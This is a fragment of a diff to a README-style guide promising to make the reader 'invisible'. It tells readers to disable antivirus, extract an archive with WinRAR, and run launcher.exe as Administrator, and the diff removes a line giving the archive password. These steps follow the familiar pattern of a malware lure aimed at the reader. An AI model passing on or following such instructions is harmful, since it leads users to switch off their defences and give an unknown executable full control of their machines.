@@ -24,7 +24,7 @@ Become invisible in 3 simple steps:
 
 2. **Prepare Your System**  
    - Disable antivirus temporarily (essential for ghost mode)  
-   - Extract using **WinRAR** (password: phantom2025)  
+   - Extract using **WinRAR**
 
 3. **Activate Ghost Protocol**  
    - Run **launcher.exe** as Administrator  
